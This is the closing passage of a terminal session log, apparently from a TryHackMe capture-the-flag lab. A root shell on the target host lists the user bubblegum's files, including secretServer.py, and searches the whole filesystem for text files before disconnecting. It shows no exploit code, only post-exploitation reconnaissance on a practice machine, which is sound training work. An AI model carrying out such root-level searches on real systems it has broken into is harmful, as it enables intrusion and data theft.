+INSTALL                NmapOps.cc          nse_main.cc          portreasons.h    utils.cc
+[01;34mlibdnet-stripped[0m       NmapOps.h           nse_main.h           portreasons.o    utils.h
+[01;34mliblinear[0m              NmapOps.o           nse_main.lua         protocols.cc     utils.o
+[01;34mliblua[0m                 nmap-os-db          nse_main.o           protocols.h      xml.cc
+[01;34mlibnetutil[0m             NmapOutputTable.cc  nse_nmaplib.cc       protocols.o      xml.h
+[01;34mlibpcap[0m                NmapOutputTable.h   nse_nmaplib.h        README-WIN32     xml.o
+[01;34mlibpcre[0m                NmapOutputTable.o   nse_nmaplib.o        scan_engine.cc   [01;34mzenmap[0m
+ltmain.sh              nmap-payloads       nse_nsock.cc         scan_engine.h    zenmap-6.00-1.spec
+]0;root@at: /home/bubblegum/nmap/nmap-6.00[01;32mroot@at[00m:[01;34m/home/bubblegum/nmap/nmap-6.00[00m# cd ..
+]0;root@at: /home/bubblegum/nmap[01;32mroot@at[00m:[01;34m/home/bubblegum/nmap[00m# ls
+[0m[01;34mnmap-6.00[0m  [01;31mnmap-6.00.tgz[0m
+]0;root@at: /home/bubblegum/nmap[01;32mroot@at[00m:[01;34m/home/bubblegum/nmap[00m# cd ..
+]0;root@at: /home/bubblegum[01;32mroot@at[00m:[01;34m/home/bubblegum[00m# ls
+[0m[01;34mDesktop[0m    [01;34mDownloads[0m  [01;34mnmap[0m      [01;34mPublic[0m   [01;32msecretServer.py[0m  [01;34mVideos[0m
+[01;34mDocuments[0m  [01;34mMusic[0m      [01;34mPictures[0m  [01;34mSecrets[0m  [01;34mTemplates[0m
+]0;root@at: /home/bubblegum[01;32mroot@at[00m:[01;34m/home/bubblegum[00m# find / -name "*.txt" -type f 2>/dev/null
+/boot/grub/gfxblacklist.txt
+/usr/lib/python3/dist-packages/launchpadlib-1.10.6.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/launchpadlib-1.10.6.egg-info/requires.txt
+/usr/lib/python3/dist-packages/launchpadlib-1.10.6.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/lazr/uri/version.txt
+/usr/lib/python3/dist-packages/lazr/restfulclient/version.txt
+/usr/lib/python3/dist-packages/chardet-3.0.4.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/chardet-3.0.4.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/chardet-3.0.4.egg-info/entry_points.txt
+/usr/lib/python3/dist-packages/defer-1.0.6.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/defer-1.0.6.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/asn1crypto-0.24.0.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/asn1crypto-0.24.0.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/ssh_import_id-5.7.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/ssh_import_id-5.7.egg-info/requires.txt
+/usr/lib/python3/dist-packages/ssh_import_id-5.7.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/olefile-0.45.1.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/olefile-0.45.1.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/requests-2.18.4.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/requests-2.18.4.egg-info/requires.txt
+/usr/lib/python3/dist-packages/requests-2.18.4.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/Mako-1.0.7.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/Mako-1.0.7.egg-info/requires.txt
+/usr/lib/python3/dist-packages/Mako-1.0.7.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/Mako-1.0.7.egg-info/entry_points.txt
+/usr/lib/python3/dist-packages/language_selector-0.1.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/language_selector-0.1.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/language_selector-0.1.egg-info/entry_points.txt
+/usr/lib/python3/dist-packages/urllib3-1.22.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/urllib3-1.22.egg-info/requires.txt
+/usr/lib/python3/dist-packages/urllib3-1.22.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/wadllib-1.3.2.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/wadllib-1.3.2.egg-info/requires.txt
+/usr/lib/python3/dist-packages/wadllib-1.3.2.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/SecretStorage-2.3.1.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/SecretStorage-2.3.1.egg-info/requires.txt
+/usr/lib/python3/dist-packages/SecretStorage-2.3.1.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/certifi-2018.1.18.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/certifi-2018.1.18.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/macaroonbakery-1.1.3.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/macaroonbakery-1.1.3.egg-info/requires.txt
+/usr/lib/python3/dist-packages/macaroonbakery-1.1.3.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/lazr.uri-1.0.3.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/lazr.uri-1.0.3.egg-info/requires.txt
+/usr/lib/python3/dist-packages/lazr.uri-1.0.3.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/lazr.uri-1.0.3.egg-info/namespace_packages.txt
+/usr/lib/python3/dist-packages/distro_info-0.18ubuntu0.18.04.1.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/distro_info-0.18ubuntu0.18.04.1.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/MarkupSafe-1.0.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/MarkupSafe-1.0.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/requests_unixsocket-0.1.5.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/requests_unixsocket-0.1.5.egg-info/requires.txt
+/usr/lib/python3/dist-packages/requests_unixsocket-0.1.5.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/pyRFC3339-1.0.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/pyRFC3339-1.0.egg-info/requires.txt
+/usr/lib/python3/dist-packages/pyRFC3339-1.0.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/zope.interface-4.3.2.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/zope.interface-4.3.2.egg-info/requires.txt
+/usr/lib/python3/dist-packages/zope.interface-4.3.2.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/zope.interface-4.3.2.egg-info/namespace_packages.txt
+/usr/lib/python3/dist-packages/netifaces-0.10.4.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/netifaces-0.10.4.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/cryptography-2.1.4.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/cryptography-2.1.4.egg-info/requires.txt
+/usr/lib/python3/dist-packages/cryptography-2.1.4.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/unattended_upgrades-0.1.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/unattended_upgrades-0.1.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/Pillow-5.1.0.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/Pillow-5.1.0.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/six-1.11.0.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/six-1.11.0.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/oauth-1.0.1.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/oauth-1.0.1.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/lazr.restfulclient-0.13.5.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/lazr.restfulclient-0.13.5.egg-info/requires.txt
+/usr/lib/python3/dist-packages/lazr.restfulclient-0.13.5.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/lazr.restfulclient-0.13.5.egg-info/namespace_packages.txt
+/usr/lib/python3/dist-packages/reportlab-3.4.0.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/reportlab-3.4.0.egg-info/requires.txt
+/usr/lib/python3/dist-packages/reportlab-3.4.0.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/keyring-10.6.0.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/keyring-10.6.0.egg-info/requires.txt
+/usr/lib/python3/dist-packages/keyring-10.6.0.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/keyring-10.6.0.egg-info/entry_points.txt
+/usr/lib/python3/dist-packages/keyring-10.6.0.egg-info/namespace_packages.txt
+/usr/lib/python3/dist-packages/pytz-2018.3.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/pytz-2018.3.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/README.txt
+/usr/lib/python3/dist-packages/protobuf-3.0.0.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/protobuf-3.0.0.egg-info/requires.txt
+/usr/lib/python3/dist-packages/protobuf-3.0.0.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/protobuf-3.0.0.egg-info/namespace_packages.txt
+/usr/lib/python3/dist-packages/python_dateutil-2.6.1.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/python_dateutil-2.6.1.egg-info/requires.txt
+/usr/lib/python3/dist-packages/python_dateutil-2.6.1.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/pymacaroons-0.13.0.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/pymacaroons-0.13.0.egg-info/requires.txt
+/usr/lib/python3/dist-packages/pymacaroons-0.13.0.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/ubuntu_drivers_common-0.0.0.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/ubuntu_drivers_common-0.0.0.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/wadllib/version.txt
+/usr/lib/python3/dist-packages/idna-2.6.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/idna-2.6.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/keyrings.alt-3.0.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/keyrings.alt-3.0.egg-info/requires.txt
+/usr/lib/python3/dist-packages/keyrings.alt-3.0.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/keyrings.alt-3.0.egg-info/entry_points.txt
+/usr/lib/python3/dist-packages/keyrings.alt-3.0.egg-info/namespace_packages.txt
+/usr/lib/python3/dist-packages/PyNaCl-1.1.2.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/PyNaCl-1.1.2.egg-info/requires.txt
+/usr/lib/python3/dist-packages/PyNaCl-1.1.2.egg-info/top_level.txt
+/usr/lib/python3/dist-packages/python_debian-0.1.32.egg-info/dependency_links.txt
+/usr/lib/python3/dist-packages/python_debian-0.1.32.egg-info/requires.txt
+/usr/lib/python3/dist-packages/python_debian-0.1.32.egg-info/top_level.txt
+/usr/lib/python3.6/LICENSE.txt
+/usr/lib/python2.7/lib2to3/Grammar.txt
+/usr/lib/python2.7/lib2to3/PatternGrammar.txt
+/usr/lib/python2.7/LICENSE.txt
+/usr/lib/xorg/protocol.txt
+/usr/lib/x86_64-linux-gnu/guile/2.0/guile-procedures.txt
+/usr/share/doc/hplip/users-guide.txt
+/usr/share/doc/apport/symptoms.txt
+/usr/share/doc/util-linux/hwclock.txt
+/usr/share/doc/util-linux/mount.txt
+/usr/share/doc/util-linux/PAM-configuration.txt
+/usr/share/doc/util-linux/howto-debug.txt
+/usr/share/doc/util-linux/pg.txt
+/usr/share/doc/util-linux/col.txt
+/usr/share/doc/util-linux/modems-with-agetty.txt
+/usr/share/doc/util-linux/getopt_changelog.txt
+/usr/share/doc/util-linux/howto-build-sys.txt
+/usr/share/doc/util-linux/cal.txt
+/usr/share/doc/util-linux/deprecated.txt
+/usr/share/doc/util-linux/howto-tests.txt
+/usr/share/doc/util-linux/getopt.txt
+/usr/share/doc/util-linux/howto-compilation.txt
+/usr/share/doc/util-linux/release-schedule.txt
+/usr/share/doc/util-linux/00-about-docs.txt
+/usr/share/doc/util-linux/blkid.txt
+/usr/share/doc/fonts-tibetan-machine/ReadMe.txt
+/usr/share/doc/openssl/HOWTO/keys.txt
+/usr/share/doc/openssl/fingerprints.txt
+/usr/share/doc/powermgmt-base/power_supply.txt
+/usr/share/doc/libauthen-sasl-perl/api.txt
+/usr/share/doc/linux-firmware/licenses/LICENCE.ralink-firmware.txt
+/usr/share/doc/linux-firmware/licenses/LICENCE.tda7706-firmware.txt
+/usr/share/doc/linux-firmware/licenses/LICENCE.rtlwifi_firmware.txt
+/usr/share/doc/linux-firmware/licenses/LICENCE.realtek-firmware.txt
+/usr/share/doc/libio-socket-ssl-perl/debugging.txt
+/usr/share/doc/gpg-agent/examples/trustlist.txt
+/usr/share/doc/fonts-sil-padauk/documentation/DOCUMENTATION.txt
+/usr/share/doc/fonts-sil-padauk/README.txt
+/usr/share/doc/cups/HOWTO_BUGREPORT.txt
+/usr/share/doc/fonts-ubuntu/CONTRIBUTING.txt
+/usr/share/doc/fonts-ubuntu/TRADEMARKS.txt
+/usr/share/doc/fonts-ubuntu/README.txt
+/usr/share/doc/libasound2-plugins/lavcrate.txt
+/usr/share/doc/libasound2-plugins/upmix.txt
+/usr/share/doc/libasound2-plugins/samplerate.txt
+/usr/share/doc/libasound2-plugins/speexdsp.txt
+/usr/share/doc/libasound2-plugins/speexrate.txt
+/usr/share/doc/libasound2-plugins/vdownmix.txt
+/usr/share/doc/libasound2-plugins/a52.txt
+/usr/share/doc/vsftpd/examples/VIRTUAL_USERS/logins.txt
+/usr/share/doc/syslinux-common/asciidoc/com-rpt.txt
+/usr/share/doc/syslinux-common/asciidoc/com-bug.txt
+/usr/share/doc/syslinux-common/asciidoc/com-name.txt
+/usr/share/doc/syslinux-common/asciidoc/hello.txt
+/usr/share/doc/syslinux-common/asciidoc/syslinux-cli.txt
+/usr/share/doc/syslinux-common/asciidoc/com-derv.txt
+/usr/share/doc/syslinux-common/README.txt
+/usr/share/doc/syslinux-common/txt/mboot.txt
+/usr/share/doc/syslinux-common/txt/gpt.txt
+/usr/share/doc/syslinux-common/txt/cptime.txt
+/usr/share/doc/syslinux-common/txt/building.txt
+/usr/share/doc/syslinux-common/txt/distrib.txt
+/usr/share/doc/syslinux-common/txt/usbkey.txt
+/usr/share/doc/fonts-sil-abyssinica/documentation/DOCUMENTATION.txt
+/usr/share/doc/publicsuffix/examples/test_psl.txt
+/usr/share/doc/libdb5.3/build_signature_amd64.txt
+/usr/share/doc/alsa-base/driver/powersave.txt
+/usr/share/doc/alsa-base/driver/MIXART.txt
+/usr/share/doc/alsa-base/driver/serial-u16550.txt
+/usr/share/doc/alsa-base/driver/VIA82xx-mixer.txt
+/usr/share/doc/alsa-base/driver/emu10k1-jack.txt
+/usr/share/doc/alsa-base/driver/ControlNames.txt
+/usr/share/doc/alsa-base/driver/Joystick.txt
+/usr/share/doc/alsa-base/driver/Bt87x.txt
+/usr/share/doc/alsa-base/driver/alsa-parameters.txt
+/usr/share/doc/busybox-static/syslog.conf.txt
+/usr/share/doc/syslinux-legacy/usbkey.txt
+/usr/share/doc/xorg/upstream-features.txt
+/usr/share/doc/xorg/faq/general.txt
+/usr/share/doc/xorg/reference/experimental.txt
+/usr/share/doc/xorg/reference/squeeze-backports.txt
+/usr/share/doc/xorg/reference/upstream-contacts.txt
+/usr/share/doc/xorg/index.txt
+/usr/share/doc/xorg/howto/triage-bugs.txt
+/usr/share/doc/xorg/howto/report-bugs.txt
+/usr/share/mysql/dictionary.txt
+/usr/share/mysql/errmsg-utf8.txt
+/usr/share/cups/doc-root/robots.txt
+/usr/share/vim/vim80/compiler/README.txt
+/usr/share/vim/vim80/indent/README.txt
+/usr/share/vim/vim80/colors/README.txt
+/usr/share/vim/vim80/keymap/README.txt
+/usr/share/vim/vim80/doc/usr_41.txt
+/usr/share/vim/vim80/doc/vi_diff.txt
+/usr/share/vim/vim80/doc/starting.txt
+/usr/share/vim/vim80/doc/pi_netrw.txt
+/usr/share/vim/vim80/doc/intro.txt
+/usr/share/vim/vim80/doc/uganda.txt
+/usr/share/vim/vim80/doc/debugger.txt
+/usr/share/vim/vim80/doc/os_mac.txt
+/usr/share/vim/vim80/doc/usr_04.txt
+/usr/share/vim/vim80/doc/usr_08.txt
+/usr/share/vim/vim80/doc/usr_21.txt
+/usr/share/vim/vim80/doc/usr_11.txt
+/usr/share/vim/vim80/doc/map.txt
+/usr/share/vim/vim80/doc/mlang.txt
+/usr/share/vim/vim80/doc/usr_32.txt
+/usr/share/vim/vim80/doc/os_amiga.txt
+/usr/share/vim/vim80/doc/os_msdos.txt
+/usr/share/vim/vim80/doc/ft_rust.txt
+/usr/share/vim/vim80/doc/os_qnx.txt
+/usr/share/vim/vim80/doc/sponsor.txt
+/usr/share/vim/vim80/doc/usr_40.txt
+/usr/share/vim/vim80/doc/tabpage.txt
+/usr/share/vim/vim80/doc/visual.txt
+/usr/share/vim/vim80/doc/pattern.txt
+/usr/share/vim/vim80/doc/scroll.txt
+/usr/share/vim/vim80/doc/digraph.txt
+/usr/share/vim/vim80/doc/print.txt
+/usr/share/vim/vim80/doc/syntax.txt
+/usr/share/vim/vim80/doc/usr_45.txt
+/usr/share/vim/vim80/doc/message.txt
+/usr/share/vim/vim80/doc/if_ole.txt
+/usr/share/vim/vim80/doc/usr_42.txt
+/usr/share/vim/vim80/doc/windows.txt
+/usr/share/vim/vim80/doc/terminal.txt
+/usr/share/vim/vim80/doc/recover.txt
+/usr/share/vim/vim80/doc/if_pyth.txt
+/usr/share/vim/vim80/doc/if_tcl.txt
+/usr/share/vim/vim80/doc/mbyte.txt
+/usr/share/vim/vim80/doc/os_risc.txt
+/usr/share/vim/vim80/doc/editing.txt
+/usr/share/vim/vim80/doc/term.txt
+/usr/share/vim/vim80/doc/usr_30.txt
+/usr/share/vim/vim80/doc/options.txt
+/usr/share/vim/vim80/doc/usr_02.txt
+/usr/share/vim/vim80/doc/os_win32.txt
+/usr/share/vim/vim80/doc/os_mint.txt
+/usr/share/vim/vim80/doc/quickfix.txt
+/usr/share/vim/vim80/doc/usr_03.txt
+/usr/share/vim/vim80/doc/farsi.txt
+/usr/share/vim/vim80/doc/version5.txt
+/usr/share/vim/vim80/doc/quotes.txt
+/usr/share/vim/vim80/doc/quickref.txt
+/usr/share/vim/vim80/doc/sign.txt
+/usr/share/vim/vim80/doc/index.txt
+/usr/share/vim/vim80/doc/os_beos.txt
+/usr/share/vim/vim80/doc/netbeans.txt
+/usr/share/vim/vim80/doc/version8.txt
+/usr/share/vim/vim80/doc/usr_20.txt
+/usr/share/vim/vim80/doc/gui_w32.txt
+/usr/share/vim/vim80/doc/various.txt
+/usr/share/vim/vim80/doc/if_mzsch.txt
+/usr/share/vim/vim80/doc/version7.txt
+/usr/share/vim/vim80/doc/spell.txt
+/usr/share/vim/vim80/doc/undo.txt
+/usr/share/vim/vim80/doc/todo.txt
+/usr/share/vim/vim80/doc/russian.txt
+/usr/share/vim/vim80/doc/arabic.txt
+/usr/share/vim/vim80/doc/filetype.txt
+/usr/share/vim/vim80/doc/if_cscop.txt
+/usr/share/vim/vim80/doc/version4.txt
+/usr/share/vim/vim80/doc/usr_09.txt
+/usr/share/vim/vim80/doc/workshop.txt
+/usr/share/vim/vim80/doc/usr_23.txt
+/usr/share/vim/vim80/doc/tagsrch.txt
+/usr/share/vim/vim80/doc/remote.txt
+/usr/share/vim/vim80/doc/gui_x11.txt
+/usr/share/vim/vim80/doc/os_os2.txt
+/usr/share/vim/vim80/doc/fold.txt
+/usr/share/vim/vim80/doc/pi_paren.txt
+/usr/share/vim/vim80/doc/if_sniff.txt
+/usr/share/vim/vim80/doc/pi_spec.txt
+/usr/share/vim/vim80/doc/if_lua.txt
+/usr/share/vim/vim80/doc/ft_sql.txt
+/usr/share/vim/vim80/doc/ft_ada.txt
+/usr/share/vim/vim80/doc/usr_06.txt
+/usr/share/vim/vim80/doc/repeat.txt
+/usr/share/vim/vim80/doc/usr_31.txt
+/usr/share/vim/vim80/doc/develop.txt
+/usr/share/vim/vim80/doc/howto.txt
+/usr/share/vim/vim80/doc/pi_tar.txt
+/usr/share/vim/vim80/doc/usr_43.txt
+/usr/share/vim/vim80/doc/motion.txt
+/usr/share/vim/vim80/doc/usr_01.txt
+/usr/share/vim/vim80/doc/pi_gzip.txt
+/usr/share/vim/vim80/doc/usr_10.txt
+/usr/share/vim/vim80/doc/usr_toc.txt
+/usr/share/vim/vim80/doc/channel.txt
+/usr/share/vim/vim80/doc/usr_28.txt
+/usr/share/vim/vim80/doc/insert.txt
+/usr/share/vim/vim80/doc/pi_vimball.txt
+/usr/share/vim/vim80/doc/autocmd.txt
+/usr/share/vim/vim80/doc/diff.txt
+/usr/share/vim/vim80/doc/usr_07.txt
+/usr/share/vim/vim80/doc/usr_25.txt
+/usr/share/vim/vim80/doc/help.txt
+/usr/share/vim/vim80/doc/pi_zip.txt
+/usr/share/vim/vim80/doc/usr_27.txt
+/usr/share/vim/vim80/doc/usr_29.txt
+/usr/share/vim/vim80/doc/eval.txt
+/usr/share/vim/vim80/doc/usr_22.txt
+/usr/share/vim/vim80/doc/hangulin.txt
+/usr/share/vim/vim80/doc/indent.txt
+/usr/share/vim/vim80/doc/usr_05.txt
+/usr/share/vim/vim80/doc/usr_24.txt
+/usr/share/vim/vim80/doc/helphelp.txt
+/usr/share/vim/vim80/doc/os_dos.txt
+/usr/share/vim/vim80/doc/hebrew.txt
+/usr/share/vim/vim80/doc/if_perl.txt
+/usr/share/vim/vim80/doc/usr_90.txt
+/usr/share/vim/vim80/doc/gui.txt
+/usr/share/vim/vim80/doc/debug.txt
+/usr/share/vim/vim80/doc/os_390.txt
+/usr/share/vim/vim80/doc/change.txt
+/usr/share/vim/vim80/doc/pi_logipat.txt
+/usr/share/vim/vim80/doc/usr_12.txt
+/usr/share/vim/vim80/doc/cmdline.txt
+/usr/share/vim/vim80/doc/os_unix.txt
+/usr/share/vim/vim80/doc/usr_44.txt
+/usr/share/vim/vim80/doc/if_ruby.txt
+/usr/share/vim/vim80/doc/rileft.txt
+/usr/share/vim/vim80/doc/pi_getscript.txt
+/usr/share/vim/vim80/doc/version6.txt
+/usr/share/vim/vim80/doc/tips.txt
+/usr/share/vim/vim80/doc/os_vms.txt
+/usr/share/vim/vim80/doc/usr_26.txt
+/usr/share/vim/vim80/rgb.txt
+/usr/share/vim/vim80/lang/README.txt
+/usr/share/vim/vim80/tutor/README.el.txt
+/usr/share/vim/vim80/tutor/README.el.cp737.txt
+/usr/share/vim/vim80/tutor/README.txt
+/usr/share/vim/vim80/pack/dist/opt/matchit/doc/matchit.txt
+/usr/share/vim/vim80/plugin/README.txt
+/usr/share/vim/vim80/ftplugin/README.txt
+/usr/share/vim/vim80/autoload/README.txt
+/usr/share/vim/vim80/syntax/README.txt
+/usr/share/vim/vim80/macros/urm/README.txt
+/usr/share/vim/vim80/macros/maze/README.txt
+/usr/share/vim/vim80/macros/README.txt
+/usr/share/xml/steg.txt
+/usr/share/ibus-table/tables/template.txt
+/usr/share/gnupg/help.gl.txt
+/usr/share/gnupg/help.zh_CN.txt
+/usr/share/gnupg/help.be.txt
+/usr/share/gnupg/help.nb.txt
+/usr/share/gnupg/help.fi.txt
+/usr/share/gnupg/help.sk.txt
+/usr/share/gnupg/help.fr.txt
+/usr/share/gnupg/help.ca.txt
+/usr/share/gnupg/help.eo.txt
+/usr/share/gnupg/help.id.txt
+/usr/share/gnupg/help.pl.txt
+/usr/share/gnupg/help.de.txt
+/usr/share/gnupg/help.pt.txt
+/usr/share/gnupg/help.ro.txt
+/usr/share/gnupg/help.zh_TW.txt
+/usr/share/gnupg/help.es.txt
+/usr/share/gnupg/help.it.txt
+/usr/share/gnupg/help.sv.txt
+/usr/share/gnupg/help.hu.txt
+/usr/share/gnupg/help.pt_BR.txt
+/usr/share/gnupg/help.ru.txt
+/usr/share/gnupg/help.ja.txt
+/usr/share/gnupg/help.tr.txt
+/usr/share/gnupg/help.cs.txt
+/usr/share/gnupg/help.et.txt
+/usr/share/gnupg/help.el.txt
+/usr/share/gnupg/help.da.txt
+/usr/share/perl/5.26.1/unicore/Blocks.txt
+/usr/share/perl/5.26.1/unicore/SpecialCasing.txt
+/usr/share/perl/5.26.1/unicore/NamedSequences.txt
+/usr/share/perl/5.26.1/Unicode/Collate/keys.txt
+/usr/share/perl/5.26.1/Unicode/Collate/allkeys.txt
+/usr/share/snmp/mibs/UCD-DLMOD-MIB.txt
+/usr/share/snmp/mibs/NET-SNMP-MONITOR-MIB.txt
+/usr/share/snmp/mibs/IANAifType-MIB.txt
+/usr/share/snmp/mibs/UCD-IPFILTER-MIB.txt
+/usr/share/snmp/mibs/SNMP-TSM-MIB.txt
+/usr/share/snmp/mibs/UCD-DISKIO-MIB.txt
+/usr/share/snmp/mibs/IANA-LANGUAGE-MIB.txt
+/usr/share/snmp/mibs/SNMP-TLS-TM-MIB.txt
+/usr/share/snmp/mibs/miblist.txt
+/usr/share/snmp/mibs/UCD-IPFWACC-MIB.txt
+/usr/share/snmp/mibs/IANA-ADDRESS-FAMILY-NUMBERS-MIB.txt
+/usr/share/snmp/mibs/NET-SNMP-EXTEND-MIB.txt
+/usr/share/snmp/mibs/NET-SNMP-PERIODIC-NOTIFY-MIB.txt
+/usr/share/snmp/mibs/NET-SNMP-VACM-MIB.txt
+/usr/share/snmp/mibs/UCD-SNMP-MIB.txt
+/usr/share/snmp/mibs/NET-SNMP-TC.txt
+/usr/share/snmp/mibs/GNOME-SMI.txt
+/usr/share/snmp/mibs/NET-SNMP-EXAMPLES-MIB.txt
+/usr/share/snmp/mibs/UCD-SNMP-MIB-OLD.txt
+/usr/share/snmp/mibs/NET-SNMP-AGENT-MIB.txt
+/usr/share/snmp/mibs/LM-SENSORS-MIB.txt
+/usr/share/snmp/mibs/UCD-DEMO-MIB.txt
+/usr/share/snmp/mibs/NET-SNMP-PASS-MIB.txt
+/usr/share/snmp/mibs/NET-SNMP-SYSTEM-MIB.txt
+/usr/share/snmp/mibs/NET-SNMP-MIB.txt
+/usr/share/snmp/mibs/RFC-1215.txt
+/usr/share/snmp/mibs/IANA-RTPROTO-MIB.txt
+^C
+]0;root@at: /home/bubblegum[01;32mroot@at[00m:[01;34m/home/bubblegum[00m# exit
+exit
+]0;gunter@at: /tmp[01;32mgunter@at[00m:[01;34m/tmp[00m$ exit
+logout
+Connection to land-of-ooo.com closed.
+[1m[7m%[27m[1m[0m                                                                                                        ]2;h471x@winux:~/Desktop/tryhackme.ctf/adventure.time/access]1;..e.time/access]7;file://winux/home/h471x/Desktop/tryhackme.ctf/adventure.time/access[0m[49m[39m[K
+[0m[27m[24m[J[0m[38;5;244m[49m[39m
+[A[38;5;244m╭─[0m[38;5;244m[47m[38;5;232m  [0m[38;5;232m[47m[47m[38;5;232m [0m[38;5;232m[47m[40m[37m[0m[37m[40m[40m[38;5;254m   [1m[38;5;254m[40m[38;5;255m~[0m[38;5;255m[40m[40m[38;5;254m/Desktop/tryhackme.ctf/adventure.time/[1m[38;5;254m[40m[38;5;255maccess[0m[38;5;255m[40m[40m[38;5;254m[0m[38;5;254m[40m[40m[38;5;254m [0m[38;5;254m[40m[49m[30m[0m[30m[49m[39m[38;5;244m···········[0m[38;5;244m[49m[30m[0m[30m[40m[32m [0m[32m[40m[40m[32m [0m[32m[40m[40m[32m [0m[32m[40m[40m[32m[38;5;136m[0m[38;5;136m[40m[48;5;136m[30m 12m 32s[0m[30m[48;5;136m[48;5;136m[30m  [0m[30m[48;5;136m[48;5;136m[30m [0m[30m[48;5;136m[48;5;136m[30m[37m[0m[37m[48;5;136m[47m[30m 16:27:24[0m[30m[47m[47m[30m  [0m[30m[47m[47m[30m [0m[30m[47m[49m[39m[38;5;244m─╮
+[0m[38;5;244m[49m[39m[38;5;244m╰─[0m[38;5;244m[49m[39m[0m[49m[39m [0m[49m[39m[K[98C[0m[49m[39m[38;5;244m─╯[39m[100D[?1h=[?2004he[1m[31me[0m[39m[1m[31me[0m[39m[90mxit[39m[1m[31me[1m[31mx[0m[39m[0m[39me[0m[39mx[39mi[1m[31me[1m[31mx[1m[31mi[0m[39m[1m[31mi[1m[31mt[0m[39m[0m[39me[0m[39mx[0m[39mi[0m[39mt[?1l>[?2004l
+]2;exit]1;exit
+Script done on 2025-01-08 16:27:25+03:00 [COMMAND_EXIT_CODE="0"]
